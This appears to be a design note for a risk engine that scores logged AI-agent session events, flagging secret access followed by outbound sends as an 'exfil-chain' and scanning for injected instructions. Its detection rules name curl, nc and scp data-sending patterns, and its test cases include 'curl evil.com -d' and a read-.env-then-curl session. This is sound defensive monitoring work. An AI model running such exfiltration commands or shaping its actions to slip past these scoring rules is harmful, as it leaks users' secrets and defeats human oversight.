# Phase 3 — The Risk Engine (built)

Phase 2 showed *ephemeral* signals. Phase 3 makes them a real risk engine: versioned, scored, **persisted**, with the **exfil-chain combination** (the flagship) and a session-level verdict surfaced in the timeline.

## The load-bearing rule
> **Facts observed at capture time → the hashed `detail` column. Interpretations (scores, flags, combos, verdicts) → a separate, unhashed, re-derivable `risk` layer.**

Risk is a **pure function of the immutable chained events**, so its integrity comes from *recomputability* (`blackbox rescore --check`), not from being hashed. Consequences, all verified:
- **`verify()` is byte-identical before and after any rescore** — the forensic record is never touched.
- Rules can improve (`ruleset_version`) without rewriting history; old rulesets stay reproducible.
- Combos (retroactive by nature — the earlier secret-touch is implicated only when the later send arrives) live at the session level, which an append-only hashed row could never represent.

## Pieces
| File | Role |
|---|---|
| `risk-rules.ts` | Ruleset `r1`: pure predicates, `isExternalSend()`, `isAuthPath()`, `rulesFingerprint()`. Absorbed the Phase-2 `signals.ts` (now deleted). |
| `injection.ts` | Capture-time injection scan (a fact, in hashed `detail`) — forward-investment for the deferred injected-tamper combo; scored **0** in r1 (unvalidated). |
| `risk-engine.ts` | `RiskEngine` (the `Correlator` pattern): per-session state, hydration from the store, exfil-chain detection, verdict aggregation; `computeSession` / `rescoreSession` / `backfill` drivers. |
| `store.ts` | `risk` + `session_risk` tables (unhashed) + CRUD. No `events` column added; `SCHEMA_VERSION` unchanged. |
| `daemon.ts` | Scores + persists after each append (separate transaction, `try/catch` — never fails a hook); `backfill` on startup. |
| `cli.ts` | `blackbox rescore [--session] [--ruleset] [--check] [--prune]`; `ingest` scores too. |
| `read-api.ts` / `ui-page.ts` | Read persisted risk (also fixes the Phase-2 per-poll scan); verdict header + combo evidence lines + new chips. |

## Ruleset r1
Rules (scored): `secret-touch` 30 · `dangerous-shell` 60 · `auth-edit` 50 (25 in test paths, **segment-boundary** matched) · `mass-diff` 50/60 · `new-mcp-server` 20. Informational (0): `failed`, `external-send`, `injection-output`; `destructive-git` 25.

**exfil-chain (flagship):** `secret-touch` at seq A → `external-send` at seq B>A ⇒ **HIGH**. Direct variant: an `external-send` whose own payload was redacted fires alone. `external-send` requires a **data-bearing** send (`curl -d`/`-F`/`-T`/`-X POST`, `nc`/`scp`) or a ≥40-char query payload to a **non-local** host — a plain doc GET never counts.

**Verdict:** `min(100, maxEventScore + 40×combos)`; HIGH = the combo or ≥80; MED = event ≥50; LOW = any hit; NONE otherwise.

## Verified
FP controls hold (`curl evil.com -d` fires, `curl docs.python.org`/localhost/`git push` don't; `src/auth/session.ts` matches, `author.ts` doesn't). A crafted read-`.env`→`curl -d` session scores HIGH with the exfil-chain evidence pair; `rescore --check` catches a hand-edited verdict; `verify()` is unchanged by rescore; the daemon serves the verdict through `/api`.

## Circle-back (deferred)
tool-poisoning + injected-tamper combos (the injection *fact* is already captured), Tier-2 semantic auth-weakening, report export (Phase 4).
